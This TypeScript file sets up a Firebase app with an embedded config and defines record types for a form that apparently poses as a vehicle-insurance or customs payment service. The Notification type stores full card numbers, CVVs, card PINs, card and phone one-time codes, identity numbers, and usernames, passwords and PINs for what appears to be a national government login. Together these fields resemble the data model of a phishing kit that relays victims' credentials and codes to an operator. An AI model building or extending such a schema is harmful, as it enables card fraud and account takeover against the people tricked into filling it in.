import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getDatabase } from "firebase/database";
import { getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyDABw1C30Hscha9m--8OgOHgOe35vfgfvE",
  authDomain: "abds-dc4aa.firebaseapp.com",
  projectId: "abds-dc4aa",
  storageBucket: "abds-dc4aa.firebasestorage.app",
  messagingSenderId: "1076311425985",
  appId: "1:1076311425985:web:01836a0f2a968f86c5a540",
  measurementId: "G-LGTNFCBFGJ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database =getDatabase(app);

export interface PaymentData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
  card_Holder_Name?: string;
}

export interface FormData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  card_Holder_Name?: string;
}
export interface Notification {
  id: string;
  agreeToTerms?: boolean;
  card_Holder_Name?: string;
  card_number?: string;
  createdDate: string;
  customs_code?: string;
  cvv?: string;
  document_owner_full_name?: string;
  expiration_date?: string;
  formData?: FormData;
  full_name?: string;
  insurance_purpose?: string;
  owner_identity_number?: string;
  pagename?: string;
  paymentData?: PaymentData;
  paymentStatus?: string;
  phone?: string;
  phone2?: string;
  seller_identity_number?: string;
  serial_number?: string;
  status?: string;
  vehicle_manufacture_number?: string;
  documment_owner_full_name?: string;
  vehicle_type?: string;
  isHidden?: boolean;
  pinCode?: string;
  otpCardCode?: string;
  phoneOtp?: string;
  otpCode?: string;
  otpStatus?: string;
  externalUsername?: string;
  externalPassword?: string;
  nafadUsername?: string;
  nafadPassword?: string;
  nafaz_pin?: string;
  autnAttachment?: string;
  requierdAttachment?: string;
  operator?: string;
  otpPhoneStatus: string;
  isRead?: boolean;
  cardOtpStatus?: string;
  phoneVerificationStatus?: string;
  phoneOtpCode?: string;
  phoneOtpStatus?: string;
}


export { app, auth, db,database };
